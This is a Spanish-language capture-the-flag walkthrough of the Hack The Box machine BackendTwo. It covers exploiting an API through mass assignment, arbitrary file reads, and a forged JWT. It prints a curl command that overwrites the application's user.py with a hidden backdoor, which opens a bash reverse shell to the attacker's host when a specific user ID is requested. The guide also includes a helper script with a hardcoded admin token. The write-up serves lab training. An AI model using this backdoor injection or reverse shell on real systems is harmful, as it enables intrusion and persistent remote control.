---
title : Máquina|BackendTwo|HTB|MassAssignment|API
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="/imgs/BackendTwo/BackendTwo0.png" style="border-radius: 150px; width: 169px" alt="BackendTwo log">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Media </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://app.hackthebox.com/machines/BackendTwo" style="color: lightblue;">Backen Two</a></p>
    </div>
</div>


 <h2><font color="white"><center> # Backend Two</center></font></h2>

 * Empezamos tirándola una traza ICMP a la maquina para ver frente a que maquina nos estamos enfrentando, y vemos que al parecer es una maquina Linux lo identificamos gracias a su ttl que es de 64.

<img src="imgs/BackendTwo/BackendTwo1.png">


* Procedemos a enumerar puertos y servicios que corren bajo este servidor.

<img src="imgs/BackendTwo/BackendTwo2.png">

* Procedemos a enumerar la pagina web y vemos que emplea el uso de API.

<img src="imgs/BackendTwo/BackendTwo3.png">

* Asi que empezamos la búsqueda del patrón.

<center>http://10.10.11.162/api/</center>
<img src="imgs/BackendTwo/BackendTwo4.png">

<center>http://10.10.11.162/api/v1/</center>
<img src="imgs/BackendTwo/BackendTwo5.png">

<center>http://10.10.11.162/api/v1/user</center>
<img src="imgs/BackendTwo/BackendTwo6.png">

<center>http://10.10.11.162/api/v1/admin</center>
<img src="imgs/BackendTwo/BackendTwo7.png">


* Probamos satisfactoriamente colocar valores identificativos en la url con el fin de poder saltar el http://10.10.11.162/api/v1/user/(inyeccion) 

<center>http://10.10.11.162/api/v1/user/1</center>
<img src="imgs/BackendTwo/BackendTwo8.png">


* Probamos enumrar direcotios con wfuzz para ver que encontramos, y vemos que al parecer como en la peticion a usuario activos.

> <center>wfuzz --hc=404,422 -c --hh=4 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.162/api/v1/user/FUZZ</center>
<img src="imgs/BackendTwo/BackendTwo9.png">


* Como esta data data viaja por GET probamos entonces que la data viaje por POST.

<img src="imgs/BackendTwo/BackendTwo10.png">


* En login nos pide primero estar autenticados.

<img src="imgs/BackendTwo/BackendTwo11.png">

* Nos intentamos entonces crear un cuenta por el método post con curl, y nos pide un campo email, password, que tienen que estar en formato json para poder ser trasmitidos.

<img src="imgs/BackendTwo/BackendTwo12.png">

* Nos creamos la cuenta en este caso use el email c3lis@c3lis.com y las credencial : c3lis123

<img src="imgs/BackendTwo/BackendTwo13.png">

* Posteriormente procedemos a "Iniciar session" desde la consola a ver si nos es permitido esta vez.

<img src="imgs/BackendTwo/BackendTwo14.png">

* Procedamos entonces a ver que hay en la pagina web para poder ver el contenido, para ello se usara BurpSuite.
<center>Configuración de BurpSuite.</center>

<img src="imgs/BackendTwo/BackendTwo15.png">

<center>Configuración de BurpSuite (Nuevo Match).</center>
<img src="imgs/BackendTwo/BackendTwo16.png">

<center>Configuración de BurpSuite (Open Browser).</center>
<img src="imgs/BackendTwo/BackendTwo17.png">

* Una vez todo configurado procedemos a visitar la pagina de login de http://10.10.11.162/api/v1/user/login y le damos a forward para que procese la petición y nos cargue la pagina web.

<img src="imgs/BackendTwo/BackendTwo18.png">


* Pero eso no es lo que nos interesa porque eso no nos mostrara nada relevante asi que por lo generar en las paginas que usan API tienen un /doc/ que este es que el que no interesa para ver el panel de login.

<img src="imgs/BackendTwo/BackendTwo19.png">

* Vemos en la pagina web un edit profile.

<img src="imgs/BackendTwo/BackendTwo20.png">


* Para ello necesitamos saber nuestro ID. Sabíamos que el ID 1 era de admin, para ello empezamos enumerar la web en busca de usuarios.

<img src="imgs/BackendTwo/BackendTwo21.png">

* Seguidamente procedemos primeramente a editar nuestro usuario en el anterior panel mostrado.

<img src="imgs/BackendTwo/BackendTwo22.png">
<br>
<center>Procedemos a modificar nuestro perfil</center>
<img src="imgs/BackendTwo/BackendTwo23.png">
<br>
<center>Ver cambios en el perfil</center>

<img src="imgs/BackendTwo/BackendTwo24.png">

* Procedemos a hacer un ataque (Mass Assignment Attack) y vemos que es vulnerable.

<img src="imgs/BackendTwo/BackendTwo25.png">

<center>Resultado</center>

<img src="imgs/BackendTwo/BackendTwo26.png">

<br>


* Podemos escribir archivos para poder ganar acceso al sistema, nos dice que el formato tiene que estar en base64, pero nos da un error al escribir el archivo.

<img src="imgs/BackendTwo2/BackendTwo20.png">

* Necesitamos de un campo en el token que tenga el parámetro debug, pero para modificar el token tenemos que tener el (Secret Token).

<img src="imgs/BackendTwo2/BackendTwo21.png">

<br>
<center>En búsqueda del Secret Token</center>
* Siendo admin ya podemos ver archivos.
<img src="imgs/BackendTwo/BackendTwo27.png">

<br>
* Vemos los requerimiento y nos pide 1 ser admin que lo somos, y dos que le formato este en base64.

<img src="imgs/BackendTwo/BackendTwo28.png">

<br>
* Iniciamos session de nuevo para que los cambios modificado anteriormente se carguen.

<img src="imgs/BackendTwo/BackendTwo29.png">
<br>
* Cargamos el /etc/passwd para validar que si podemos cargar archivos.

<img src="imgs/BackendTwo/BackendTwo30.png">

* Nos montamos un script simple en bash para que este proceso sea mas cómodo.


```bash

#!/bin/bash

function ctrl_c(){
	echo -e "\e[31;1m\n 	*Saliendo\n\n\e[0m"
	exit 2
}

trap ctrl_c INT


filename=$(echo -n "$1" | base64)

curl -s X 'GET' "http://10.10.11.162/api/v1/admin/file/$filename"  -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzMwNjk5NTIwLCJpYXQiOjE3MzAwMDgzMjAsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYzA2N2JhMTItMzNjNi00M2E3LWI4ODAtNTIwM2VlOTY2NjkwIn0.hGG9mHZ-wo8IxVPhbOog-bcYZuqsh6VjvM5tQNQoYWY' | jq -r '.file'

```
<font color="red"><center><a href="uploads/exploit_Maquina-Backend-Two.sh" download>>Descargar<</a></center></font>



* Exportamos las variables de entorno en la maquina.

<img src="imgs/BackendTwo/BackendTwo31.png">

* Listamos los procesos que se están ejecutando y vemos algo interesante, que llama a python3.

<img src="imgs/BackendTwo/BackendTwo32.png">

* Vemos que ejecuta un archivo en app/main lo que me hace pensar que puede ser un archivo en python.

<img src="imgs/BackendTwo/BackendTwo33.png">

* primeramente necesitamos saber cual es el usuario en el que esta corriendo esta API.
> <center> ./fast_api.sh /etc/passwd | grep 'sh$"</center>
<img src="imgs/BackendTwo/BackendTwo34.png">

* Ahora si procedemos a listar el archivo en /home/htb/app/main.py, al buscar por el token llama a deps para importar el token
lo que me hace pensar que crear sus propias librerías      

<img src="imgs/BackendTwo/BackendTwo36.png">

* Ahora importa settings para llamar al token.

<img src="imgs/BackendTwo/BackendTwo37.png">

* Ahora vemos que llama a una salida del sistema llamada API_KEY, que era la anterior que habíamos visto en /proc/self/environ

<img src="imgs/BackendTwo/BackendTwo38.png">

* Es decir que el secreto para editar esta API es ls string que habíamos encontrado en /proc/self/environ: 

<img src="imgs/BackendTwo/BackendTwo39.png">

* Una vez ya tenemos el secreto podemos usarlo para modificar la API y agregar el flag de requerimiento que nos pedía para poder
tramitar comandos, para ello procedemos usar python, para modificar la api con la librería jwt. ()

<img src="imgs/BackendTwo2/BackendTwo22.png">

* Procedemos a codificar el token modificado para su posterior uso.

<img src="imgs/BackendTwo2/BackendTwo23.png">

* Una vez hecho probemos entonces poder cargar archivos.

<img src="imgs/BackendTwo2/BackendTwo24.png">

* Suponiendo que tenemos algún tipo de permiso en /home/htb/app/api/v1/endpoints/user.py procedemos a infectar el código
para cuando lance una petición a un código especifico me lance una reverse Shell a mi maquina de atacante, para ello, como vamos a tener que escapar es archivo para en base a futuro no nos de problemas usar Ciberchef para escapar las comillas dobles simples, y saltos de linea de tal forma que quede de la siguiente manera.


```bash
curl http://10.10.11.162/api/v1/admin/file/$(echo -n "/home/htb/app/api/v1/endpoints/user.py" | base64) -H 'Content-Type: application/json' -d '{"file": "from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:\n    if field.field_info.extra.get(\"hidden_from_schema\", False):\n        raise schema.SkipField(f\"{field.name} field is being hidden\")\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -> Any:\n    \"\"\"\n    Fetch a user by ID\n    \"\"\"\n    if user_id == -3186:\n        import os; os.system('\''bash -c \"bash -i >& /dev/tcp/10.10.16.2/4445 0>&1\"'\'')\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\"/{user_id}/edit\")\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Edit the profile of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.put(\"/{user_id}/password\")\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Update the password of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.post(\"/login\")\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -> Any:\n    \"\"\"\n    Get the JWT for a user with data from OAuth2 request form body.\n    \"\"\"\n    \n    timestamp = datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\")\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Failure for {form_data.username}\\n\")\n        raise HTTPException(status_code=400, detail=\"Incorrect username or password\")\n    \n    with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Success for {form_data.username}\\n\")\n\n    return {\n        \"access_token\": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \"token_type\": \"bearer\",\n    }\n\n@router.post(\"/signup\", status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -> Any:\n    \"\"\"\n    Create new user without the need to be logged in.\n    \"\"\"\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\"The user with this username already exists in the system\",\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n"}' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzMwODU0MTcwLCJpYXQiOjE3MzAxNjI5NzAsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiM2JkZjM2MzEtNTgzMS00NGZhLTkxYzAtZDAwOTZkYjM0ZjRjIiwiZGVidWciOnRydWV9.IYrqSxZoecmOVECazY_oLmh2oC03IkWpmGkjRbuc-Zo'
```

* De esta forma al lanzar un petición curl a la parte curl http://10.10.11.162/api/v1/user/-3186 tendremos acceso.

<img src="imgs/BackendTwo3/BackendTwo30.png">

* Una vez ganado acceso al sistema empezamos a hacer el tratamiento a la tty.

<img src="imgs/BackendTwo3/BackendTwo31.png">

* Procedemos a exportar variables de entorno para pode hacer ctrl + l y demás funciones.

<img src="imgs/BackendTwo3/BackendTwo32.png">

* Podemos en este punto ver la flag del usuario.

<img src="imgs/BackendTwo3/BackendTwo33.png">

* Vemos credencial del usuario htb en el archivo auth.log 

<img src="imgs/BackendTwo3/BackendTwo34.png">

* Al hacer sudo -l vemos que estamos en tipo de juego.

<img src="imgs/BackendTwo3/BackendTwo35.png">

* Procedemos a ver el archivo de configuración de pan wordle.

<img src="imgs/BackendTwo3/BackendTwo36.png">

* Le echamos un ojo al archivo de configuración.

<img src="imgs/BackendTwo3/BackendTwo37.png">

* Con string vemos el archivo de configuración de este bin, vemos que busca una palabras que coincidan con este archivo a la hora de colocar una credencial para validarla si este relacionada.

<img src="imgs/BackendTwo3/BackendTwo38.png">

* Me copio ese archivo de palabras y lo coloco en mi maquina para empezar a validarlas.

<img src="imgs/BackendTwo3/BackendTwo39.png">

* Hacemos sudo -l y empezamos en la búsqueda de la credencial que se relacione, en este caso la palabra correcta era union.

<img src="imgs/BackendTwo3/BackendTwo310.png">

* En este punto como somos del grupo sudo, ya podemos ver la flag de root.

<img src="imgs/BackendTwo3/BackendTwo311.png">



